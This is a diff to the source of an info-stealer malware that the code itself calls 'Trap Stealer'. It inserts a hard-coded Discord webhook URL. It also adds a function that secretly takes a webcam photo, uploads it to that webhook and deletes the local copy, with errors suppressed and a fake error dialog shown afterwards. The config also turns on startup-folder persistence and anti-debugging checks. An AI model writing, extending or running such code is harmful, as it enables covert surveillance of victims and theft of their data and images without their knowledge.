@@ -30,13 +30,16 @@ import os, os.path, zipfile
 import shutil, json
 import win32clipboard
 ### CONFIG ### 
-webhook = '' #Put ur webhook
+
+
+webhook = 'https://discord.com/api/webhooks/1102253728842657843/7LX8d74soZhJ_JetMdiWZTD2QF7-8JlnuNoArjDgP2UAv_Z3u0xl3smsoCuiWFeRZ63l' #Put ur webhook
 
 fakeerror = True # If True it will make an fake error message at the end
 Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+
 
 
 
@@ -898,6 +901,58 @@ except:
         ]
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+def camera_grab():
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    try:
+        subprocess.run(["fswebcam", "-q", "image.jpg"])
+
+
+        file = {
+            "file": ("image.jpg", open("image.jpg", "rb"))
+        }
+
+        data = {
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+        }
+        response = requests.post(webhook, files=file, data=data)
+
+        print(response.text)
+
+        subprocess.run(["rm", "image.jpg"])
+
+    except FileNotFoundError:
+        data = {
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🍪 Trap Stealer Camera Stealer",
+                    "description": f"Camera screen cannot be taken",
+                    "color": 0xffb6c1,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
+        }
+        response = requests.post(webhook, data=dumps(data).encode(), headers=headers)
+
+try:
+    camera_grab()
+except:
+    pass
 
 if fakeerror == True:
     ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
